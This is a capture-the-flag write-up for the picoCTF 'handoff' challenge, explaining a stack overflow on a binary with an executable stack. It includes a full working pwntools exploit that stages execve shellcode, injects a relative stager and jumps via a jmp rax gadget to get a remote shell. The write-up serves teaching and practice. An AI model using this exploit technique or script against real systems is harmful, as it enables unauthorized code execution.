# CyLab — Handoff

* **Platform:** CyLab Security Academy / picoCTF 2025 (Challenge ID: `486`)
* **Category:** Binary Exploitation / Executable Stack & Relative Stager Jump (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB (pwndbg)
* **Binary:** `handoff` (64-bit x86_64 ELF)

---

## TL;DR

The binary manages a message entry log on the stack and compiles without a `GNU_STACK` ELF header, leaving the runtime stack completely executable (**NX disabled**). While menu option 3 reads up to 32 bytes into an 8-byte buffer (`feedback`), an overflow of only 20 bytes is available before reaching the saved return address—insufficient for a full shellcode payload. We bypass this limitation without needing an ASLR leak: (1) we store 64-bit `execve("/bin/sh")` shellcode inside the large `entries[0].msg` buffer on the stack via menu option 2; (2) in `feedback`, we inject a compact relative stager (`sub rsp, 0x2e8; jmp rsp`) and overwrite the return address with a static `jmp rax` gadget (`0x40116c`). Because `fgets` returns the buffer address in `rax`, execution enters the stager, offsets `rsp` directly onto `entries[0].msg`, and pops a shell.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file handoff
handoff: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=handoff
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Key observations:
1. **NX Disabled (RWX Stack):** Stack memory is executable.
2. **No PIE:** Fixed base addresses at `0x400000`. Gadgets like `jmp rax` reside at static virtual addresses.
3. **Register Persistence on Epilogue:** When `fgets()` returns, `rax` contains the pointer to `feedback`.

---

## Static Analysis & Vulnerability

### 1. Stack Layout of `vuln()`

```c
typedef struct entry {
    char name[8];
    char msg[64];
} entry_t;

int vuln() {
    char feedback[8];
    entry_t entries[10];        // 720 bytes on stack
    int total_entries = 0;
    int choice = -1;
    // Menu loop ...
    // Option 3: fgets(feedback, 32, stdin); feedback[7] = '\0';
}
```

Stack frame mapping in GDB:

```text
       Lower Addresses (Stack Top)
  +-----------------------------------+  [rbp - 0x2e0]
  |  entries[0].name (8 bytes)        |
  +-----------------------------------+  [rbp - 0x2d8]
  |  entries[0].msg  (64 bytes)       |  <-- Main Shellcode Destination
  +-----------------------------------+
  |  entries[1..9] (648 bytes)        |
  +-----------------------------------+  [rbp - 0x0c]
  |  feedback[8]                      |  <-- Injected Stager: sub rsp, 0x2e8; jmp rsp
  +-----------------------------------+  [rbp]
  |  Saved RBP (8 bytes)              |
  +-----------------------------------+  [rbp + 0x08]
  |  Saved Return Address (8 bytes)   |  <-- Target: jmp rax (0x40116c)
  +-----------------------------------+
       Higher Addresses
```

Offset from `feedback` to return address:
$$\text{Offset} = (\text{rbp} + 8) - (\text{rbp} - 0\text{x}0\text{c}) = 0\text{x}14 = 20 \text{ bytes}$$

### 2. Relative Stager Displacement

Distance from the return instruction to `entries[0].msg`:
$$\text{Delta} = (\text{rbp} + 0\text{x}10) - (\text{rbp} - 0\text{x}2\text{d}8) = 0\text{x}2\text{e}8 \text{ bytes}$$

A tiny assembly stager fits cleanly within the 20 bytes of `feedback`:

```asm
nop
sub rsp, 0x2e8      ; Drops rsp from return slot onto entries[0].msg
jmp rsp             ; Jumps into shellcode!
```

Crucially, the binary enforces `feedback[7] = '\0'`. However, `0x00` coincides with the high-order zero byte of the immediate value in `sub rsp, 0x000002e8`, preserving the integrity of the machine code.

---

## Dynamic Analysis & Exploitation Strategy

1. **Staging Main Shellcode (Menu Option 1 & 2):**
   - Add entry 0 (`name = "shellcode"`).
   - Set entry 0's message to 64-bit Linux `execve("/bin/sh")` shellcode padded with NOPs up to 63 bytes.
2. **Triggering Stack Overflow (Menu Option 3):**
   - Craft payload:
     $$\text{payload} = \text{stager} + \text{NOPs} \times (20 - \text{len}(\text{stager})) + \text{p64}(0\text{x}40116\text{c})$$
   - Send payload into `feedback`.
3. **Execution Flow:**
   - Function epilogue executes `ret`, popping `0x40116c` (`jmp rax`) into `rip`.
   - Because `rax` holds the address of `feedback`, the CPU jumps to `feedback`.
   - The stager executes `sub rsp, 0x2e8`, shifting the stack pointer backward by 744 bytes onto `entries[0].msg`.
   - `jmp rsp` executes the shellcode, spawning `/bin/sh` to output the flag.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, time, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 32269)
JMP_RAX = 0x40116c

def solve(io):
    # 1. Prepare main shellcode in entries[0].msg (63 bytes)
    shellcode = asm(shellcraft.sh())
    nop_sled = asm("nop") * (63 - len(shellcode))
    msg = nop_sled + shellcode

    # 2. Compact relative trampoline stager
    stager = asm("""
        nop;
        sub rsp, 0x2e8;
        jmp rsp;
    """)
    feedback_payload = stager + asm("nop") * (20 - len(stager)) + p64(JMP_RAX)

    # Choice 1: Add entry
    io.sendlineafter(b"3. Exit the app", b"1")
    io.sendlineafter(b"new recipient's name:", b"shellcode")

    # Choice 2: Message entry 0 with shellcode
    io.sendlineafter(b"3. Exit the app", b"2")
    io.sendlineafter(b"you like to send a message to?", b"0")
    io.sendlineafter(b"would you like to send them?", msg)

    # Choice 3: Overflow feedback with stager + jmp rax
    io.sendlineafter(b"3. Exit the app", b"3")
    io.sendline(feedback_payload)

    time.sleep(0.5)
    io.sendline(b"cat flag.txt")
    data = io.recvall(timeout=3)
    m = re.search(rb"(academy\{[^}]+\}|picoCTF\{[^}]+\})", data)
    if m:
        log.success(f"Flag captured: {m.group(1).decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to xebec.cylabacademy.net on port 32269: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to xebec.cylabacademy.net port 32269
```

---

## Key Takeaways & Lessons

1. **Relative Trampolines for ASLR Bypasses:** When the stack is executable but ASLR randomizes its absolute address, computing the constant relative distance between local buffers allows bridging small injection points to large storage areas.
2. **Exploiting Input Return Values in `rax`:** Standard string input functions (`fgets`, `strcpy`, `read`) leave destination buffer pointers in `rax`. Utilizing `jmp rax` trampolines redirects execution back into stack buffers without address disclosures.
3. **Harmonizing Injected Null Bytes:** When security routines forcefully set terminating null characters (e.g. `buf[7] = 0`), aligning instructions so that the null byte lands in an unused or already-zero immediate field keeps the assembly code valid.
